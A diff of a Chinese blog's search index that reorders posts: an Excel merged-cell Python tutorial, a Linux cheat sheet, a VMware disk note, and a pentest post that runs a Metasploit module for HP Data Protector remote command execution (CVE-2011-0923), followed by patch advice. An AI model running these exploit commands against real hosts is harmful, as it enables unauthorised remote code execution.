@@ -1,31 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HP Data Protector漏洞利用记录</title>
-    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
-<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
-<a id="more"></a>
-<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
-<li>升级Data Protector到A.06.20 或更高版本</li>
-<li>对服务启用加密</li>
-<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
     <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
@@ -40,35 +15,6 @@
       </categories>
       <tags>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux命令备忘</title>
-    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
-    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
-<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
-<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
-<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
-<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
-<a id="more"></a></li>
-<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
-<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
-<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
-<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
-<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>
-
-
-
-
-</li>
-</ol>
-<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -141,37 +87,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python读取Excel合并单元格</title>
-    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-12-27.png"></p>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
-<li>Python 3</li>
-<li>xlrd==1.2.0</li>
-</ul>
-<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
-<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
-<p>示例代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
-<p>结果输出：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
-
-<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SHELL写文件的几种方式</title>
     <url>/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
@@ -222,6 +137,91 @@
         <category>渗透测试</category>
       </categories>
       <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python读取Excel合并单元格</title>
+    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-12-27.png"></p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
+<li>Python 3</li>
+<li>xlrd==1.2.0</li>
+</ul>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
+<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
+<p>示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
+<p>结果输出：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令备忘</title>
+    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
+    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
+<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
+<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
+<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
+<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
+<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
+<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
+<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
+<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
+<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+</li>
+</ol>
+<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HP Data Protector漏洞利用记录</title>
+    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
+<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
+<a id="more"></a>
+<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>升级Data Protector到A.06.20 或更高版本</li>
+<li>对服务启用加密</li>
+<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
         <tag>渗透测试</tag>
       </tags>
   </entry>
@@ -324,25 +324,6 @@
       </categories>
       <tags>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VMware虚拟机磁盘空间压缩</title>
-    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
-    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
-<p>执行后等待进度条结束即可：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
-<a id="more"></a>
-
-<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
-<p>压缩后占用：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
-]]></content>
-      <categories>
-        <category>折腾</category>
-      </categories>
-      <tags>
-        <tag>折腾</tag>
       </tags>
   </entry>
   <entry>
@@ -454,6 +435,38 @@
       </tags>
   </entry>
   <entry>
+    <title>vim简易快捷配置</title>
+    <url>/2020/08/21/vim%E7%AE%80%E6%98%93%E5%BF%AB%E6%8D%B7%E9%85%8D%E7%BD%AE/</url>
